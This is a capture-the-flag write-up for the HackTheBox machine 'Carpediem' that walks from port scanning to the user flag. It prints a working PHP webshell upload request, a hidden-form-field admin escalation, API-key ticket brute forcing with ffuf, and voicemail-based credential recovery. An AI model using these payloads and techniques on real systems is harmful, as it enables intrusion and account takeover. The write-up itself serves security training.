---
title: "Carpediem"
date: 2026-10-18 07:00:00 -0500
categories: [HackTheBox, Linux]
tags: [hackthebox, linux, hard, vhost, idor, file-upload, api-key, voip, asterisk, ssh]
description: "Carpediem is a Hard Linux box whose foothold chains a hidden-field privilege flip with an unfinished file-upload endpoint to get RCE inside a Docker container, then pivots through a leaked Trudesk API key and a VoIP voicemail to recover an SSH password. This post covers recon through the user flag."
---

## Overview

Carpediem is a Hard Linux machine themed around a motorcycle store portal. The foothold abuses a custom web app: a self-registered account promotes itself to admin by flipping a hidden `login_type` form field, then an "not yet implemented" upload endpoint happily accepts a PHP webshell, landing RCE as `www-data` inside a Docker container. From there a hard-coded Trudesk API key, ticket-ID brute forcing, and an Asterisk voicemail recording hand over an SSH password for the user `hflaccus`. This post goes from recon to the user flag; privilege escalation is intentionally left out.

## Recon

| Port | Service |
|------|---------|
| 22/tcp | OpenSSH |
| 80/tcp | nginx — "Coming Soon", reveals `carpediem.htb` |
| 5060/udp | Asterisk PBX (SIP) |

The landing page on port 80 just shows a *Coming Soon* placeholder and the hostname `carpediem.htb`. Worth a vhost fuzz.

```bash
nmap -sC -sV 10.10.11.167
sudo nmap -sU -sC -sV 10.10.11.167   # Asterisk on 5060/udp
```

## Enumeration

Fuzzing virtual hosts on `carpediem.htb` surfaces a `portal.` subdomain — a "Motorcycle Store Portal" with a login + registration flow and an `/admin` directory.

```bash
wfuzz -w /usr/share/seclists/Discovery/DNS/subdomains-top1million-5000.txt \
  -u carpediem.htb -H "Host: FUZZ.carpediem.htb" --hh 2875
# -> portal.carpediem.htb
gobuster dir -u http://portal.carpediem.htb \
  -w /usr/share/seclists/Discovery/Web-Content/raft-medium-words-lowercase.txt
```

Register an account; you're logged in automatically, but `/admin` is denied — the account isn't privileged yet.

## Foothold

**Step 1 — flip the hidden role field.** On the *Update Account Details* form, intercept the submit. There's a hidden input the server trusts to decide your role:

```http
<input type="hidden" name="login_type" value="2">
```

Change `login_type=2` to `login_type=1` and forward. The account is re-saved as an admin, and `/admin` now loads.

**Step 2 — abuse the "unfinished" upload.** The *Quarterly Report Upload* page pops a note that uploads aren't implemented, but the request still hits `Users.php?f=upload`. Intercept it and supply a multipart body with a PHP payload:

```http
POST /classes/Users.php?f=upload HTTP/1.1
Host: portal.carpediem.htb
Content-Type: multipart/form-data; boundary=---x
-----x
Content-Disposition: form-data; name="file_upload"; filename="p.php"
Content-Type: image/jpeg

<?php system($_GET['cmd']); ?>
-----x--
```

The page shows an error, but Burp's response confirms the file was written. It's reachable under `/uploads/`:

```bash
curl 'http://portal.carpediem.htb/uploads/<ts>_p.php?cmd=id'   # uid=33(www-data)
```

![backdrop-module-rce](/assets/Images/carpediem-003_foothold_backdrop-module-rce.png)

**Step 3 — leaked API key → VoIP creds.** Inside the container, the portal source hard-codes a Trudesk API key:

```bash
cat /var/www/html/portal/classes/Trudesk.php
# apikey = f8691bd2d8d613ec89337b5cd5a98554f8fffcc4 , host trudesk.carpediem.htb
```

Trudesk has no "list tickets" endpoint, but ticket IDs are small sequential integers (starting ~1001). Brute them with the key:

```bash
for u in {1000..9999}; do echo $u; done > 4digit_uid
ffuf -H "Accesstoken: f8691bd2d8d613ec89337b5cd5a98554f8fffcc4" \
  -u http://trudesk.carpediem.htb/api/v1/tickets/FUZZ -w 4digit_uid -fs 42
# tickets 1004-1008 exist
for u in {1004..1008}; do curl -H "Accesstoken: f8691bd2d8d613ec89337b5cd5a98554f8fffcc4" \
  http://trudesk.carpediem.htb/api/v1/tickets/$u | jq; done
```

The tickets describe onboarding a new network engineer: VoIP extension `9650`, phone PIN `2022`, and that his initial server credentials were left as a *voicemail* reachable by dialling `*62`.

**Step 4 — listen to the voicemail.** Configure a SIP softphone (Zoiper) against the Asterisk PBX:

```text
Domain:   carpediem.htb
Username: 9650
Password: 2022
```

Dial `*62`, enter PIN `2022`, play the message — it speaks the SSH password for `hflaccus` (`H<redacted>`). SSH in:

```bash
ssh hflaccus@10.10.11.167
```

## User flag

```bash
cat /home/hflaccus/user.txt   # HTB{...}
```

![user-flag](/assets/Images/carpediem-001_foothold_user-flag.png)

Shell as `hflaccus` achieved.

> Foothold complete. Privilege escalation is left as an exercise — this post stops at user.
